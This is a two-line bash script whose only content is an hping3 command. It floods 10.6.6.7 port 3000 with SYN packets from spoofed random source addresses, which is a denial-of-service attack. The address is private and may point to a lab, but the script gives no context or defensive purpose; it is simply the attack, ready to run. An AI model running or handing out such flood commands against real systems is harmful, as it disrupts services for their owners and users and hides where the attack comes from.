#!/bin/bash

sudo hping3 --rand-source 10.6.6.7 --flood -S -L 0 -p 3000
